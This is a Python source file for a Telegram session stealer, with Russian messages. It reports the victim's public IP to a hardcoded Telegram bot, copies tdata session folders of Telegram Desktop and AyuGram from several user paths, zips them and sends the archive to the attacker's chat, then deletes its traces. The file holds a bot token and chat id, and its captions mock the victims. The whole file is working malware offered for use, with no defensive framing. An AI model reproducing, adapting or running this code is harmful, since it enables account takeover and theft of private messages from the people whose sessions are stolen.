import os
import shutil
import zipfile
import telebot
import requests



TOKEN = '8414105553:AAEne4aJLsEY_VFOk-xdW_nakHN2c6NSmq4'
chat_id = 6218800642 # id свой
bot = telebot.TeleBot(TOKEN)
def get_victim_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "UnknownIP"
    
bot.send_message(chat_id, f"🔥🔥🔥🔥🔥🔥🔥🔥🔥 \n\n\n\n дебил с {get_victim_ip()} запустил софт")


def create_tgsession_folder():
    home = os.path.expanduser("~")
    tgsession_dir = os.path.join(home, "Windows_NB_TGsession")
    os.makedirs(tgsession_dir, exist_ok=True)
    return tgsession_dir

def copy_telegram_session(target_folder, telegram_paths):
    found_any = False
    
    for path_index, src_dir in enumerate(telegram_paths):
        if not os.path.exists(src_dir):
            continue
            
        found_in_path = False
        
        path_folder = os.path.join(target_folder, f"path_{path_index+1}")
        os.makedirs(path_folder, exist_ok=True)
        
        for item in os.listdir(src_dir):
            src_path = os.path.join(src_dir, item)
            dest_path = os.path.join(path_folder, item)  
            
            try:
                if os.path.isfile(src_path) and item.endswith("s") and item not in ["countries", "settingss"]:
                    shutil.copy2(src_path, dest_path)
                    found_in_path = True
                    found_any = True
                    
                    folder_name = item[:-1]
                    folder_src = os.path.join(src_dir, folder_name)
                    if os.path.isdir(folder_src):
                        shutil.copytree(folder_src, os.path.join(path_folder, folder_name))
            except Exception:
                continue
        
        if found_in_path:
            bot.send_message(chat_id, f"✅ Сессия найдена по пути {path_index+1}: {src_dir}")
        else:
            bot.send_message(chat_id, f"❌ В пути {path_index+1} нет сессии: {src_dir}")
            gg = 1
    return found_any

def main():
    victim_ip = get_victim_ip()
    
    # МАССИВ ПУТЕЙ 
    telegram_paths = [
        
        os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Telegram Desktop", "tdata"),
        os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "TelegramDesktop", "tdata"),
        os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "AyuGram Desktop", "tdata"),
        os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "AyuGramDesktop", "tdata"),
        os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "AyuGram", "tdata"),
        os.path.join(os.path.expanduser("~"), "Desktop", "tdata"),
        os.path.join(os.path.expanduser("~"), "Downloads", "tdata"),
        
    ]
    
    tgsession_dir = create_tgsession_folder()
    
    if copy_telegram_session(tgsession_dir, telegram_paths):
        zip_name = f"tg_session_{victim_ip}.zip"
        zip_path = os.path.join(os.environ['TEMP'], zip_name)
        
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for root, dirs, files in os.walk(tgsession_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    arcname = os.path.relpath(file_path, tgsession_dir)
                    zipf.write(file_path, arcname)
        
        with open(zip_path, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"🔥 Тдата спизжена у дебила! | IP: {victim_ip}")
        
        shutil.rmtree(tgsession_dir)
        os.remove(zip_path)
    else:
        bot.send_message(chat_id, f"❌ Ни в одном пути tdata не найдена! | IP: {victim_ip}")

if __name__ == "__main__":
    main()